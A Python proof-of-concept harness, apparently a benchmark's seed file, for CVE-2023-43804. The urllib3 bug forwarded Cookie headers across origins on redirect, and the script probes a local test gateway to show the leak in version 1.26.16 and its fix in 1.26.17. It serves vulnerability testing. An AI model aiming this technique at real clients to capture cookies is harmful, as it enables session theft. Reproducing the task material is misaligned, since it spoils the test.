#!/usr/bin/env python3
"""[GIVEN] original_poc.py -- CVE-2023-43804 seed exploit (Cookie leak on cross-origin redirect).

urllib3 <= 1.26.16 stripped only `Authorization` on a cross-origin redirect. The `Cookie`
header was NOT in that set, so it was forwarded across origins. CVE-2023-43804 (1.26.17)
added "Cookie" to the set.

This PoC hits the HTTP gateway to run the probe inside the container.

  V0 (1.26.16): leaks  -> Cookie not in strip set.
  V1 (1.26.17): BLOCKED -> CVE-2023-43804 fix adds "Cookie" to remove_headers_on_redirect.

Run via the oracle:  original_poc(version="v0"|"v1").
"""
import json
import os
import urllib.request

HOST = os.environ.get("PCB_HOST", "127.0.0.1")
_PORT_ENV = os.environ.get("PCB_PORT") or os.environ.get("PCB_TARGET_PORT")
PORTS = {"v0": 39509, "v1": 39510, "v2": 39511}


def original_poc(version="v1"):
    port = int(_PORT_ENV) if _PORT_ENV else PORTS[version]
    url = f"http://{HOST}:{port}/probe?mode=seed"
    try:
        resp = urllib.request.urlopen(url, timeout=30)
        data = json.loads(resp.read().decode())
    except Exception as e:
        return f"ERROR: {e}"
    headers_body = data.get("headers", "")
    return f"SEED_FINAL_HEADERS:{headers_body}"


if __name__ == "__main__":
    import sys
    print(original_poc(sys.argv[1] if len(sys.argv) > 1 else "v1"))
